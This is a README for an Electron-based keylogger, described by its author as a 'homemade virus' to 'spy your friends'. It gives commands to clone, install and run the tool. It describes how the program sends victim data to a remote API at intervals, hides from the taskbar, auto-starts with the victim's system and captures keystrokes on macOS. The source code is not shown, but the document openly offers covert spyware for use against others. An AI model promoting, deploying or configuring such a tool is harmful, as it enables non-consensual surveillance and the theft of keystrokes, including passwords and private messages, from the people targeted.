# electron-keylogger
Spy your friends with this JavaScript homemade virus.
![myimage-alt-tag](http://g.recordit.co/FOeD5sBuTS.gif)
## Installing
Electron Keylogger it's very easy to be installed, just run the following commands:
```
git clone https://github.com/heliojuniorkroger/electron-keylogger
cd electron-keylogger
npm install
```
## Test your virus
This virus is pre-configurated to send data with your victim information in intervals for an API (see on **preparePack.js**). You can simulate an API running a **json-server** from the file **db.json** inside the **fake-api** folder.
To run the application:
```
electron .
```
(Look that the virus not even it's showed on the task bar).
## Aditional info
You can see a file named **autoLaunch.js** inside the virus folder. Basicaly, this file makes the virus starts together with the system of your victim. You need to configure if you want to use (don't worry, it's very easy, when you open the file, you make it).
## Keyboard compatibility
By default, the **prepareKey.js** it's configurated to run in a Mac OS. If you run in another OS, with a different keyboard type, maybe doesn't work fine.